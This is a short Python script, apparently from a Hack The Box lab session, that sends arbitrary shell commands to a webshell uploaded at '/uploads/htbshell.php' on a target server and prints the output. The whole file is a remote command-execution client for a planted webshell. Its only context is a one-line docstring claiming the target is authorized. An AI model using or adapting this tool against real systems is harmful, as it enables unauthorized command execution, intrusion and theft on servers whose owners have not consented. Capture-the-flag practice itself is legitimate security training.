#!/usr/bin/env python3
"""Run a command through the uploaded webshell on the authorized HTB target."""
import sys
import os
import urllib.parse
import client

cmd = " ".join(sys.argv[1:]) or "id"
path = "/uploads/htbshell.php?cmd=" + urllib.parse.quote(cmd)
r = client.request("GET", path)
h, b = client.split(r)
body = client.dechunk(h, b)
# strip the <pre> wrapper
body = body.replace("<pre>", "").replace("</pre>", "")
print(body.rstrip())
